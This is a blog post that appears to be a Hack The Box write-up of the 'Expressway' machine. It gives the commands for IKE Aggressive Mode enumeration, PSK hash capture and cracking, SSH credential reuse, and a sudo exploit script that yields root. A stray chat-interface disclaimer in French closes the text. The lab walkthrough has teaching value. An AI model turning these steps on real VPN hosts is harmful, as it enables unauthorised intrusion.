---
layout: post
title: "Hack The Box — Expressway"
date: 2025-09-20 00:00:00 +0100
author: pain
categories:
  - Hack The Box
  - Linux
tags:
  - htb
  - vpn
  - ike
  - ipsec
  - credential-reuse
  - sudo
  - privilege-escalation
toc: true
comments: false
image:
  path: /assets/img/expressway/cover.png
  alt: Hack The Box Expressway machine
---

## Machine Information

**Target IP:** 10.10.11.87  
**Operating System:** Linux  
**Attack Path:** IKE Aggressive Mode → Credential Reuse → Sudo Privilege Escalation

---

## Enumeration
```bash
nmap -sS -sU -sC -sV -F 10.10.11.87
```

### Findings

- 22/tcp (SSH) — open
- 69/udp (TFTP) — open
- 500/udp (ISAKMP / IKE) — open
- 4500/udp (NAT-T) — open|filtered

IKE on UDP 500 is the primary attack focus.

---

## IKE Enumeration
```bash
ike-scan -M -A 10.10.11.87
```

### Findings

- Aggressive Mode enabled
- Authentication: PSK
- Encryption: 3DES
- Hash: SHA1
- DH Group: modp1024
- Identity leaked: ike@expressway.htb

Aggressive Mode allows offline PSK attacks.

---

## PSK Hash Capture
```bash
ike-scan -M --aggressive 10.10.11.87 -n ike@expressway.htb --pskcrack=swart.txt
```

### Findings

- Aggressive handshake captured
- PSK hash stored locally

Attack moves fully offline.

---

## PSK Cracking
```bash
psk-crack -d rockyou.txt swart.txt
```

### Findings

- PSK recovered: freakingrockstarontheroad

Weak PSK confirmed.

---

## SSH Access
```bash
ssh ike@10.10.11.87
```

### Findings

- Login successful using PSK

VPN credentials reused for system access.

---

## User Flag
```bash
cat /home/ike/user.txt
```

### Findings

- User flag obtained

---

## Local Enumeration
```bash
./linpeas.sh
```

### Findings

- Multiple sudo versions
- Custom sudo binary: /usr/local/bin/sudo
- User ike in proxy group

Sudo is likely escalation vector.

---

## Privilege Escalation
```bash
chmod +x /tmp/sudo-chwoot.sh
/tmp/sudo-chwoot.sh
```

### Findings

- Root shell obtained
- id shows uid=0(root)

---

## Root Flag
```bash
cat /root/root.txt
```

### Findings

- Root flag obtained

---

## Attack Chain Summary

- IKE Aggressive Mode leaked user identity
- Offline PSK crack recovered weak shared secret
- Credential reuse granted SSH access as ike
- Custom sudo binary exploited for root privilege escalation
- Full system compromise achieved

---

## Conclusion

Expressway demonstrates critical VPN misconfigurations and credential hygiene failures. IKE Aggressive Mode exposure combined with weak PSK enabled initial access, while custom sudo misconfigurations provided a direct path to root.Claude est une IA et peut faire des erreurs. Veuillez vérifier les réponses.
